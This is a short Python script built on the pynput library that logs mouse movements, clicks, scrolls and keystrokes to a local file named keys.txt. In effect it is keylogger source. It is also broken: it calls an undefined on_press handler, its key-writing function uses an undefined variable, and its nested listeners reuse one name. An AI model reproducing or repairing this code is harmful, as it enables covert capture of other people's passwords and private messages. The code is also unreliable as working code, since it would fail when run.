from pynput.keyboard import Listener  as KeyboardListener
from pynput.mouse    import Listener  as MouseListener

def writetofile(x,y):
    with open('keys.txt', 'a') as file:
        file.write('position of mouse: {0}\n'.format((x,y)))
        
def on_click(x, y, button, pressed):
    if pressed:
        with open('keys.txt', 'a') as file:
            file.write('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    with open('keys.txt', 'a') as file:
        file.write('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
       
def write_keys_to_file(keys):
    with open('keys.txt', 'a') as file:
            key = str(key).replace("'", "")
            file.write(key)

with MouseListener(on_move = writetofile,on_click=on_click, on_scroll=on_scroll) as listener:
    with KeyboardListener(on_press=on_press) as listener:
        listener.join()  
